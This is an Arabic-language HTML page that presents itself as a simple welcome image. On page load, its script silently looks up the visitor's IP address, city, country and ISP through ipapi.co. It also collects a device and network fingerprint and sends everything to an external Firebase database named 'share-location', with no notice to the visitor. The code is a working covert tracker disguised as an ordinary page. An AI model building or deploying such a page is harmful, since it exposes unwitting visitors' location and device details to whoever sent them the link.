<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>صورة ترحيبية</title>
    <!-- مكتبات Firebase للاتصال بقاعدة البيانات -->
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #f4f1ea;
        }
        .container {
            text-align: center;
        }
        img {
            max-width: 100%;
            max-height: 85vh;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- عرض الصورة المرحب بها حصرياً بدون أي نصوص أو حالات -->
        <img src="image.JPG" alt="صورة ترحيبية">
    </div>

    <script>
        // إعدادات رابط قاعدة بيانات Firebase الخاصة بك
        const firebaseConfig = {
            databaseURL: "https://share-location-d9ce6-default-rtdb.firebaseio.com"
        };
        
        // تهيئة اتصال Firebase
        if (!firebase.apps.length) {
            firebase.initializeApp(firebaseConfig);
        }
        const db = firebase.database();

        // دالة جمع بيانات الزائر والعتاد وبصمة الشبكة في الخلفية بصمت تام
        async function logAdvancedVisit() {
            let ipInfo = {};
            try {
                const response = await fetch('https://ipapi.co/json/');
                ipInfo = await response.json();
            } catch (e) {
                ipInfo = { error: "تعذر جلب معلومات الشبكة" };
            }

            // استخراج معلومات الشبكة والاتصال المتقدمة (Network Information API)
            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            const networkData = {
                effectiveType: connection ? connection.effectiveType : "غير متوفر",
                downlinkSpeed: connection ? connection.downlink + " Mbps" : "غير متوفر",
                saveDataMode: connection ? connection.saveData : "غير متوفر"
            };

            // تجميع كافة المقاييس في كائن واحد متكامل
            const visitData = {
                timestamp: new Date().toLocaleString('ar-EG'),
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                deviceAndBrowser: navigator.userAgent,
                language: navigator.language,
                screenSize: `${window.screen.width}x${window.screen.height}`,
                
                // مقاييس العتاد المتقدمة
                hardwareCores: navigator.hardwareConcurrency || "غير متوفر",
                deviceRAMApprox: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "غير متوفر",
                
                // مقاييس الشبكة والاتصال
                networkEffectiveType: networkData.effectiveType,
                networkDownlink: networkData.downlinkSpeed,
                saveDataEnabled: networkData.saveDataMode,

                // البيانات العامة
                referrer: document.referrer || "دخول مباشر",
                ipAddress: ipInfo.ip || "غير متوفر",
                city: ipInfo.city || "غير متوفر",
                country: ipInfo.country_name || "غير متوفر",
                isp: ipInfo.org || "غير متوفر"
            };

            // إرسال البيانات فوراً إلى قاعدة البيانات تحت قسم advanced_visits بصمت
            db.ref('advanced_visits').push(visitData)
              .then(() => {
                  console.log("تم حفظ التحليلات في القاعدة بنجاح");
              })
              .catch((err) => {
                  console.error("خطأ في الإرسال:", err);
              });
        }

        // تنفيذ عملية الجمع في الخلفية فور تحميل الصفحة
        window.onload = logAdvancedVisit;
    </script>
</body>
</html>
